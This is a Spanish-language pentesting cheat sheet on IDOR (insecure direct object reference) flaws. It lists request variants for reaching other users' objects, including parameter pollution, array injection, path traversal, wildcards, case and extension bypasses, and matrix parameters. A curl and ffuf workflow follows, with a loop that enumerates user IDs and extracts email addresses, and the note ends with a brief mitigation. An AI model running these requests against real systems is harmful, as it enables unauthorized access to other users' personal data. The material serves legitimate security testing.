---
aliases:
tags:
  - vuln/idor
  - technique/discovery
  - asset/api
  - asset/web-app
primary categories:
secondary categories:
tertiary categories:
kind: SubCheatSheet
linked:
  - "[[BOLA - IDOR]]"
---
# IDOR - Manipulación de Parámetros y Rutas

---

## Cheatsheet

| **Request** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `GET /profile?user_id=106` | Perfil de otro usuario (ID secuencial) | IDs enteros predecibles. |
| `GET /api/v1/users/106/data` | Datos del usuario 106 vía path RESTful | Path con ID en URL segments. |
| `GET /api/messages?id=105&id=106` | HTTP Parameter Pollution — backend procesa segundo `id` mientras valida el primero | Discrepancia parser proxy vs backend. |
| `GET /view?doc[]=105&doc[]=106` | Array injection — múltiples docs en una request | Backend bypasea validación de "doc único". |
| `GET /api/users/105/../../users/106/profile` | Path traversal en estructura RESTful | Routing laxo que normaliza `..` después de autz. |
| `GET /report?id=*` o `GET /report?id=%` | Wildcard en DB query → dump completo | Backend pasa `id` directo a SQL `LIKE`. |
| `GET /users/106.json` | Bypass de autz que aplica solo a `.html` | Framework filtra extensión-base, no .json/.xml. |
| `GET /account?Id=106` o `GET /account?ID=106` | Case bypass en nombre del param | WAF filtra `id` lowercase, backend acepta cualquier case. |
| `GET /data?id={"id":106}` | JSON embebido en value de param GET | Backend acepta payload mixto. |
| `GET /api/users/105;id=106` | Matrix parameter injection | Backend con parsing matrix-style (Java/Spring). |
| `GET /api/users/-1` o `GET /api/users/0` | Edge IDs revelan usuario admin / system | Cuentas system con IDs negativos/cero. |
^idor-parametros

### Workflow

```bash
# 1. Capturar request original en Burp con sesión Usuario A
# 2. Loguearse como Usuario B en otro browser → capturar IDs propios
# 3. Probar swap manual en Repeater
curl -H 'Cookie: session=USER_A_COOKIE' "https://target/profile?user_id=106"

# 4. HPP automático en burp/ffuf
ffuf -w ids.txt -u "https://target/profile?user_id=105&user_id=FUZZ" \
     -H 'Cookie: session=USER_A_COOKIE' \
     -mr 'Usuario B\|email_de_B'

# 5. Iterar IDs secuenciales para enumeration masiva
for i in $(seq 1 1000); do
  RES=$(curl -s -H 'Cookie: session=USER_A' "https://target/profile?user_id=$i" | grep -oE 'email":"[^"]+')
  echo "$i: $RES"
done
```

### Mitigación

Validación de autorización a nivel modelo: el usuario autenticado (del token, no del request) debe tener permiso explícito sobre el objeto referenciado. RBAC/ABAC > ofuscar IDs.

---
